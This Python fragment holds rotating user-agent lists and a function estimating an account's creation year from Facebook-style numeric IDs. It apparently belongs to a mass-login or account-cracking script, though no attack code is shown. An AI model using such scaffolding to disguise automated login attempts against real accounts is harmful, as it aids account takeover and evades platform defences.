AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 MZBrowser/7.4.1 UWS/2.11.0.34 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m1 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; MZ-15 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.1.310-2020040818 UWS/2.MZ-15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-M3s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu 16Xs Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3 Max Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-M6T Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.11.5 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.97 MZBrowser/8.9.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-PRO 5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-M6 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0.0; zh-CN; MZ-PRO 6 Plus Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu X8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-PRO 6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.2.110-2018082915 UWS/2.15.0.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-16 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m3 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.9.110-2019060317 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-U20 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-MEIZU M6 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M3E Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; MZ-PRO 7 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.110-2020060117 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 5.1.1; zh-CN; MZ-MX4 Pro Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; MZ-meizu note8 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5s Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-MEIZU_M5 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; zh-CN; MZ-M5c Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/8.2.210-2020061519 UWS/2.15.0.4 Mobile Safari/537.36'



#TAHUN#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

#---------[ USER AGENT JOS ]-----------#
ua_star  = [
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.5112.99 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5177.1 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36,gzip(gfe)',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; ru; M2010J19SY Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.9.900 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; en-US; M2010J19SG Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; ar-eg; Mi 9T Pro Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.7.0-gn',
'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36;]',
'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; RMX2189 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; moto g(6) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Nokia 7.1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; moto g(6) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/E7FBAF',
'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/E7FBAF',
'Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/E7FBAF',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0-gn',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/E7FBAF',
'Mozilla/5.0 (Linux; U; Android 10; ru-ru; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.10.0-gn',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)',
'Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+',
'Mozilla/5.0 (Linux; Android 9; SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; Zoom 3.6.0; BIDUBrowser 2.x)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6.0; rv:6.7) Gecko/20100101 Firefox/6.7.1',
'Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/26.0.823.0 Safari/532.1.0',
'Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/32.0.823.0 Safari/534.0.1',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.7; rv:6.9) Gecko/20100101 Firefox/6.9.0',
'Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.76 Mobile Safari/537.36',
'Nokia5350/10.1.011 (SymbianOS/10; U; Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba',
'NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokiac1-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0',
'Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
'Mozilla/5.0 (Symbian/3; Series60/5.4 Nokia808PureView/112.010.1506; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.2.1.21 Mobile Safari/535.1 3gpp-gba',
'Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; Notepad_K10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; ASUS_Z017D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.3 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (Linux; Android 9; LG-H870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36 (Ecosia android@85.0.4183.127)',
'Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-N9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mlozilla/5.0 (Linux; Android 8.1.0; meizu X8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; ASUS_X01AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; M2007J17I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SHT-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2102J20SG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Nokia 7.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; IN2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; LIO-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Nokia C5 Endi) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; BAC-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SKR-H0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; G3112 Build/40.0.A.5.14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.0.0; SO-01J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto g(7) optimo (XT1952DL)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-P610 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.4 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91',
'Mozilla/5.0 (Linux; Android 5.1.1; PSP7530DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; ALP-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; arm_64; Android 9; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 YaBrowser/20.3.0.276.00 Mobile SA/1 Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Mi Note 10 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; BLN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; CLT-L04) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.26 Safari/537.36 Edg/85.0.564.13',
'Mozilla/5.0 (Linux; Android 11; SM-F415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G928F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; KIICAA POWER Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36',
